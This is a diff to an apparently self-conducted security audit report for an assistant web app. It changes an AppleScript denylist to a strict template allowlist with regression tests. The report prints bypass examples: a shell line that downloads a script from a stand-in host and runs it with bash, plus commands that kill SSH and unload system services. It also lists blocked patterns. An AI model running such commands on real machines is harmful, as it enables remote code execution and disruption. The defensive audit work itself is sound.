@@ -9,7 +9,7 @@ no exploitation attempted, own code only.
 | # | Severity | Location | Finding | Status |
 |---|----------|----------|---------|--------|
 | 1 | High | `web-ui/app/api/jarvis/biometrics/route.ts` | Owner PII (full name + date of birth) hardcoded in source as the "identity challenge" answer key | **Fixed** — moved to `OWNER_FULL_NAME`/`OWNER_DOB` env vars (documented in `.env.example`), feature now returns `not_configured` when unset |
-| 2 | Medium | `web-ui/lib/apple-automation.js` (`validateAppleScript`) | Denylist-based blocklist for AI-generated AppleScript passed to `osascript`; blocks a few destructive patterns (`rm -rf`, `sudo`, `curl\|sh`, ...) but a denylist is inherently bypassable (e.g. `do shell script "curl -o /tmp/x && bash /tmp/x"`, `chmod`, `launchctl`, `pkill`, base64-wrapped commands, alternate `rm` flags) | Documented, not auto-fixed |
+| 2 | Medium | `web-ui/lib/apple-automation.js` (`validateAppleScript`) | AppleScript passed to `osascript` was screened by a bypassable denylist (e.g. `do shell script "curl -o /tmp/x && bash /tmp/x"`, `chmod`, `launchctl`, `pkill`, base64-wrapped commands, alternate `rm` flags) | **Fixed** — allowlist only; any `do shell script` must exactly match a fixed template (screenshot, battery status); `web-ui/test/apple-automation.test.js` covers each bypass |
 | 3 | Low | `mcp/tools/health.js` (`resolveProjectPath`) | The original path-confinement finding: `health_check` could target paths outside its workspace root | **Fixed** — paths are checked for lexical and symlink/junction-resolved containment; `mcp/test/health.test.js` covers traversal and external symlink escapes |
 | 4 | Info | root `npm audit`, `web-ui` `npm audit` | 0 vulnerabilities (info/low/moderate/high/critical) at scan time | No action needed |
 | 5 | Info | XSS / `dangerouslySetInnerHTML` | No occurrences of `dangerouslySetInnerHTML` found in `web-ui`; `dompurify` appears only in `package-lock.json` (transitive), not imported anywhere — no raw HTML-from-API rendering path was found | No action needed |
@@ -54,18 +54,15 @@ required before the challenge even runs), so no new exposure is introduced;
 the fix only removes the hardcoded PII and makes the feature a no-op until an
 operator opts in via their own `.env.local`.
 
-### 2. AppleScript validation denylist (not auto-fixed)
+### 2. AppleScript shell execution (fixed)
 
 `api/mac-control/route.ts` lets an authenticated user (permission:
 `mac_control`, macOS only) send natural language that an LLM turns into
-AppleScript, or submit a script directly. Before running it with `osascript`,
-`validateAppleScript()` rejects a short list of regex patterns
-(`rm -rf`, `sudo`, `shutdown`/`reboot`, `mkfs`, `diskutil erase`, `dd if=`,
-`csrutil disable`, a `curl|wget … | sh/bash` pipeline, and
-`delete every` in System Events).
-
-This is a blocklist, not an allowlist, so it can be bypassed by any
-destructive shell invocation that doesn't match those exact patterns, e.g.:
+AppleScript, or submit a script directly, and runs it with `osascript`.
+`validateAppleScript()` originally rejected a short list of regex patterns
+(`rm -rf`, `sudo`, a `curl|wget … | sh` pipeline, …). Because that was a
+denylist, any destructive shell call outside those exact patterns got
+through, e.g.:
 
 ```applescript
 do shell script "curl -s https://evil/x -o /tmp/x.sh && bash /tmp/x.sh"
@@ -74,20 +71,30 @@ do shell script "launchctl unload com.apple.something"
 do shell script "pkill -9 -f ssh"
 ```
 
-**Why not auto-fixed here**: closing this properly requires a design change
-(e.g. an allowlist of safe verb/phrase templates, or dropping `do shell
-script` support entirely and only allowing the small set of
-`knownAppleScript()` templates), which would change behavior/break the
-"free-form AI-generated automation" feature this endpoint exists for. That's
-a product decision, not a drop-in patch, so it's recorded here instead of
-guessed at. Mitigating factors already in place: requires auth +
-`mac_control` permission, macOS-only, 10–20s `exec` timeouts, and scripts are
-run from a randomly-named temp file (no injection via the temp path itself).
+**Fix applied** (T-162): `validateAppleScript()` in
+`web-ui/lib/apple-automation.js` is now an allowlist.
 
-**Suggested follow-up** (needs product sign-off): replace the denylist with
-an allowlist of script templates, or require explicit user confirmation
-(surfaced diff of the generated script) before any `do shell script` call is
-executed.
+- Any script that contains `do shell script` (any case or whitespace) passes
+  only if it is **identical** to one of the fixed `SHELL_SCRIPT_TEMPLATES`:
+  the screenshot template and the battery-status template. Line endings are
+  normalised; nothing else is pattern-matched, so appended commands, edited
+  arguments, or extra lines are rejected.
+- Every other script must match one of the narrow non-shell action templates
+  (open URL, activate app, set volume/mute, lock screen, show desktop).
+- The mac-control route returns 400 on validation failure before writing the
+  temp file or calling `osacompile`/`osascript`. The JARVIS `runScript`
+  path uses the same validator. The route's LLM prompt now embeds the exact
+  templates, so a generated screenshot or battery script can pass.
+
+Regression coverage in `web-ui/test/apple-automation.test.js` rejects each
+bypass above plus base64-piped, `rm -fr`/`rm -r -f`,
+`with administrator privileges`, mixed-case, and near-miss template variants.
+It also asserts statically that the route validates before any
+`osacompile`/`osascript` sink.
+
+Trade-off: free-form AI-generated automation (Messages, Mail, Teams UI
+scripting, Finder paths) is now rejected unless it matches an approved
+template. Widening it needs new, reviewed templates, not a looser validator.
 
 ### 3. MCP `health_check` tool path confinement (fixed)
 
